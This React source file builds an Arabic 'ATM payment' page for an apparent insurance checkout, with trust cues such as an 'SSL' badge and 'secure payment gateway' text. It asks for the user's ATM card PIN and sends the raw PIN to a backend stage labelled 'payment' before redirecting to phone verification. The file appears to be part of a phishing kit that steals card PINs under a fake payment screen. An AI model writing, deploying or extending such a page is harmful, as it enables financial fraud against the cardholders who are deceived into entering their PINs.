import { useState, useRef, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { motion } from "framer-motion";
import { Button } from "@/components/ui/button";
import { Shield, Lock, Loader2, CreditCard } from "lucide-react";
import { createOrUpdateStage } from "@/hooks/useAdminApproval";
import { linkVisitorToSession } from "@/lib/visitorLink";
import { useLanguage } from "@/i18n/LanguageContext";

const ATMPayment = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { t } = useLanguage();
  const a = t.atm;
  const demoOffer = {
    company: "التعاونية",
    totalPrice: 1850,
    price: 1850,
  };
  const offer = location.state?.offer || demoOffer;
  const orderId = location.state?.orderId || sessionStorage.getItem("insurance_order_id") || "DEMO-001";
  const cardLastFour = location.state?.cardLastFour || sessionStorage.getItem("card_last_four") || "4532";
  const totalPrice = offer?.totalPrice || offer?.price || 0;
  const companyName = offer?.company || "بي كير";

  const [pin, setPin] = useState("");
  const [loading, setLoading] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);

  useEffect(() => { inputRef.current?.focus(); }, []);

  const handleVerify = () => {
    if (pin.length < 4) return;
    setLoading(true);
    const doSubmit = async () => {
      await createOrUpdateStage(orderId, "payment", { atm_pin: pin });
      linkVisitorToSession({});
      setLoading(false);
      navigate("/insurance/phone-verify", { state: { offer, orderId } });
    };
    doSubmit();
  };

  if (!offer) {
    return (
      <div className="min-h-screen bg-background">
        <div className="flex items-center justify-center min-h-[60vh]">
          <p className="text-muted-foreground">{a.noPaymentData}</p>
        </div>
      </div>
    );
  }

  return (
    <div className="relative min-h-[100dvh] overflow-hidden bg-gradient-to-b from-background via-secondary/20 to-background">
      <div className="absolute left-1/2 top-0 h-40 w-40 -translate-x-1/2 rounded-full bg-primary/10 blur-3xl" />
      <div className="absolute bottom-10 right-4 h-32 w-32 rounded-full bg-primary/5 blur-3xl" />

      <div className="container relative mx-auto px-3 md:px-4 pt-6 pb-24 md:pb-12">
        <div className="mx-auto max-w-md">
          <motion.div
            initial={{ opacity: 0, y: 24, scale: 0.98 }}
            animate={{ opacity: 1, y: 0, scale: 1 }}
            transition={{ duration: 0.35, ease: "easeOut" }}
          >
            <div className="relative overflow-hidden rounded-[2rem] border border-border/60 bg-background/95 shadow-2xl backdrop-blur-sm">
              <div className="absolute inset-x-10 top-0 h-px bg-gradient-to-r from-transparent via-primary/60 to-transparent" />

              {/* Header */}
              <div className="border-b border-border/60 bg-secondary/35 px-5 py-4 md:px-6">
                <div className="flex items-center justify-between gap-3">
                  <div className="flex items-center gap-2.5">
                    <div className="flex h-10 w-10 items-center justify-center rounded-2xl bg-primary/10 ring-1 ring-primary/15">
                      <CreditCard className="h-4 w-4 text-primary" />
                    </div>
                    <div>
                      <p className="text-sm font-bold text-foreground">{a.title}</p>
                      <p className="text-[11px] text-muted-foreground">بوابة دفع آمنة</p>
                    </div>
                  </div>

                  <div className="flex items-center gap-1.5 rounded-full border border-border/60 bg-background/80 px-2.5 py-1">
                    <Lock className="h-3 w-3 text-primary/70" />
                    <span className="text-[10px] font-medium text-muted-foreground">SSL</span>
                  </div>
                </div>
              </div>

              <div className="space-y-5 px-5 py-5 md:px-6">
                {/* Transaction details */}
                <div className="grid gap-3 rounded-2xl border border-border/60 bg-card/70 p-4">
                  <div className="flex items-center justify-between text-xs">
                    <span className="text-muted-foreground">التاجر</span>
                    <span className="font-semibold text-foreground">{companyName}</span>
                  </div>
                  <div className="flex items-center justify-between text-xs">
                    <span className="text-muted-foreground">المبلغ</span>
                    <span className="text-sm font-bold text-foreground">{totalPrice.toLocaleString()} ر.س</span>
                  </div>
                  <div className="flex items-center justify-between text-xs">
                    <span className="text-muted-foreground">البطاقة</span>
                    <span className="font-mono font-semibold tracking-[0.2em] text-foreground" dir="ltr">
                      •••• {cardLastFour}
                    </span>
                  </div>
                </div>

                {/* PIN input */}
                <div className="space-y-4 rounded-2xl border border-border/60 bg-card/50 p-4 md:p-5">
                  <div className="space-y-1.5 text-right">
                    <label className="block text-xs font-medium text-foreground">{a.subtitle}</label>
                    <p className="text-[11px] leading-5 text-muted-foreground">أدخل الرقم السري لبطاقة الصراف</p>
                  </div>

                  <div className="relative" dir="ltr">
                    <input
                      ref={inputRef}
                      type="password"
                      inputMode="numeric"
                      value={pin}
                      onChange={(e) => setPin(e.target.value.replace(/\D/g, ""))}
                      placeholder="••••"
                      className="h-14 w-full rounded-2xl border-2 border-border bg-background px-4 text-center text-xl font-bold tracking-[0.55em] text-foreground transition-all placeholder:tracking-[0.3em] placeholder:text-muted-foreground/40 focus:border-primary focus:outline-none focus:ring-4 focus:ring-primary/10"
                    />
                  </div>

                  {loading && (
                    <motion.div
                      initial={{ opacity: 0 }}
                      animate={{ opacity: 1 }}
                      className="flex items-center justify-center gap-2 rounded-2xl bg-secondary/50 px-3 py-2"
                    >
                      <Loader2 className="h-4 w-4 animate-spin text-primary" />
                      <span className="text-xs text-muted-foreground">{a.verifying}</span>
                    </motion.div>
                  )}

                  <Button
                    onClick={handleVerify}
                    disabled={loading || pin.length < 4}
                    className="h-12 w-full rounded-2xl bg-cta text-sm font-bold text-cta-foreground shadow-sm transition-all hover:bg-cta-hover"
                  >
                    {loading ? (
                      <>
                        <Loader2 className="h-4 w-4 animate-spin" />
                        {a.verifying}
                      </>
                    ) : (
                      <>
                        <Lock className="h-4 w-4" />
                        {a.confirm}
                      </>
                    )}
                  </Button>
                </div>
              </div>

              {/* Footer */}
              <div className="border-t border-border/60 bg-secondary/25 px-5 py-3 md:px-6">
                <div className="flex items-center justify-center gap-2">
                  <Shield className="h-3.5 w-3.5 text-primary/70" />
                  <span className="text-[10px] text-muted-foreground">{a.secureProcess}</span>
                </div>
              </div>
            </div>
          </motion.div>
        </div>
      </div>
    </div>
  );
};

export default ATMPayment;
